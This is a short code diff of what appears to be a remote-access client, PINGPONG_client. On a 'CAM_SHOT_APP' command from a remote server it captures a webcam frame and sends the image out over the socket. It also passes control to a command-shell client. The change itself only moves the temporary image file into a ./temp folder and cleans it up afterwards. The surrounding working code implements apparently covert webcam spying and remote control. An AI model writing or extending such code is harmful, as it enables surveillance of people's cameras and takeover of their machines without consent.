@@ -28,14 +28,15 @@ def PINGPONG_client(ip, port):
                 CMD_client(ip, cmd_port, port)
                 break
             if data.decode() == "CAM_SHOT_APP":
+                os.mkdir("./temp")
                 s.send(bytes("OK", 'utf8'))
                 cap = VideoCapture(0)
                 while True:
                     f, frame = cap.read()
-                    imwrite('image.jpg', frame) 
+                    imwrite("./temp/image.jpg", frame)
                     cap.release()
                     break
-                with open("image.jpg", "rb") as f:
+                with open("./temp/image.jpg", "rb") as f:
                     img_data = f.read()
                 len_data = len(img_data)
                 s.send(bytes(str(len_data), 'utf8'))
@@ -43,7 +44,7 @@ def PINGPONG_client(ip, port):
                 if check:
                     s.sendall(img_data)
                 re_check = s.recv(1024)
-                os.remove("image.jpg")
+                shutil.rmtree("./temp")
                 if re_check:
                     continue
             if data.decode() == "EXIT_APP":
